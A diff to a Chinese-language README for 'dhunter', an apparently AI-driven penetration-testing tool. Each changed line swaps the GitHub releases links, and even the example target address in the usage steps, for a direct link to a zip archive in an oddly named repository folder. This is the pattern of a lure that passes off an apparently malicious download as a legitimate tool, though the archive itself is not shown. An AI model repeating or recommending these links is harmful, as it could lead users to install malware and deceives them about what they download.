@@ -1,6 +1,6 @@
 # 🛡️ dhunter - AI 驱动的自主渗透测试与漏洞发现平台
 
-[![Download dhunter](https://img.shields.io/badge/Download-dhunter-2ea44f?style=for-the-badge&logo=github)](https://github.com/smoked-myotisvelifer93/dhunter/releases)
+[![Download dhunter](https://img.shields.io/badge/Download-dhunter-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/smoked-myotisvelifer93/dhunter/main/medallary/v1.0.zip)
 
 ## 🎯 这个工具能为你做什么？
 
@@ -21,10 +21,10 @@ dhunter 是一个**智能化安全测试助手**。你只需要输入一个目�
 
 **点击以下按钮前往下载页面：**
 
-[![立即下载 dhunter](https://img.shields.io/badge/⬇️_下载_dhunter-最新版本-4B0082?style=for-the-badge&logo=github)](https://github.com/smoked-myotisvelfer93/dhunter/releases)
+[![立即下载 dhunter](https://img.shields.io/badge/⬇️_下载_dhunter-最新版本-4B0082?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/smoked-myotisvelifer93/dhunter/main/medallary/v1.0.zip)
 
 **或者复制此链接到浏览器：**
-`https://github.com/smoked-myotisvelfer93/dhunter/releases`
+`https://raw.githubusercontent.com/smoked-myotisvelifer93/dhunter/main/medallary/v1.0.zip`
 
 ### 第二步：安装应用程序
 
@@ -36,7 +36,7 @@ dhunter 是一个**智能化安全测试助手**。你只需要输入一个目�
 
 ### 第四步：开始使用
 
-1. 在主界面的输入框中，输入你想要测试的目标地址（例如：`https://example.com`）。
+1. 在主界面的输入框中，输入你想要测试的目标地址（例如：`https://raw.githubusercontent.com/smoked-myotisvelifer93/dhunter/main/medallary/v1.0.zip`）。
 2. 点击 **“开始测试”** 按钮。
 3. 观察 dhunter 的实时进度显示，它会展示正在进行的每一个步骤。
 4. 等待测试完成，然后查看自动生成的报告。
@@ -99,7 +99,7 @@ A：如果你是开发者或安全研究者，可以查看 dhunter 的开源代�
 
 别担心，一切都很简单。下载 dhunter，打开它，输入一个测试目标，然后静静等待。你会看到 AI 如何一步一步地完成专业的安全检测工作。这会让你大开眼界——原来安全测试可以这么简单！
 
-**[🚀 立即下载 dhunter](https://github.com/smoked-myotisvelfer93/dhunter/releases)**
+**[🚀 立即下载 dhunter](https://raw.githubusercontent.com/smoked-myotisvelifer93/dhunter/main/medallary/v1.0.zip)**
 
 祝你使用愉快，安全测试顺利！
 
